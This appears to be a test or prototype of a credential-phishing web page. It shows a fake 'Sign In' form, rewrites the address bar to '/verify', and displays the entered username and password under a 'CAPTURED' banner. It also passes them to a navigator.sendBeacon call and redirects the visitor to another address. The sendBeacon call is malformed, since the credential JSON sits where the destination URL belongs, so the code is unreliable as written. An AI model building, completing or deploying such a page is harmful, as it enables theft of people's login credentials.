<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>testing345</title>
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        font-family: system-ui, -apple-system, sans-serif;
        background: #fafafa;
      }
      .cta {
        font-size: 16px;
        padding: 12px 18px;
        border-radius: 8px;
        border: 0;
        background: #0066ff;
        color: #fff;
        cursor: pointer;
        width: 100%;
      }
      #modal {
        max-width: 400px;
        margin: 80px auto;
        background: #ffffff;
        padding: 28px;
        border-radius: 12px;
        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.15);
        text-align: center;
      }
      input {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border: 1px solid #ddd;
        border-radius: 4px;
        font-size: 14px;
      }
      .alert {
        margin-top: 16px;
        font-size: 12px;
        color: #d32f2f;
        font-weight: bold;
        display: none;
      }
      #captured-data {
        margin-top: 20px;
        padding: 15px;
        background: #f0f0f0;
        border: 1px dashed #333;
        border-radius: 8px;
        text-align: left;
        font-family: monospace;
        font-size: 13px;
        word-break: break-all;
        display: none;
      }
      .label { color: #555; }
      .value { color: #0066ff; font-weight: bold; }
    </style>
  </head>
  <body>

    <div id="modal">
      <h2>Sign In</h2>
      <p>Enter your credentials to continue</p>
      <input type="text" id="user" placeholder="Username" />
      <input type="password" id="pass" placeholder="Password" />
      <button class="cta" onclick="submit()">Sign In</button>
      
      <div class="alert" id="alert">CAPTURED</div>

      <div id="captured-data">
        <p style="margin-bottom: 5px; border-bottom: 1px solid #ccc;"><strong>Captured Output:</strong></p>
        <div><span class="label">User:</span> <span id="out-user" class="value"></span></div>
        <div><span class="label">Pass:</span> <span id="out-pass" class="value"></span></div>
      </div>
    </div>

    <script>
      const alertBox = document.getElementById("alert");
      const captureBox = document.getElementById("captured-data");

      window.onload = () => {
        history.pushState(null, "", "/verify");
      };

      function submit() {
        const u = document.getElementById("user").value;
        const p = document.getElementById("pass").value;

        if (u && p) {
          alertBox.style.display = "block";

          captureBox.style.display = "block";
          document.getElementById("out-user").innerText = u;
          document.getElementById("out-pass").innerText = p;

          navigator.sendBeacon(
            JSON.stringify({
              username: u,
              password: p,
              timestamp: new Date().toISOString()
            }),
          );
        } else {
          alert("fill");
        }
      }
      window.addEventListener("pageshow", () => {
        requestAnimationFrame(() => {
          requestAnimationFrame(() => {
            setTimeout(() => {
              location.href = "https://google.com:9090";
            }, 80);
          });
        });
      });
    </script>
  </body>
</html>
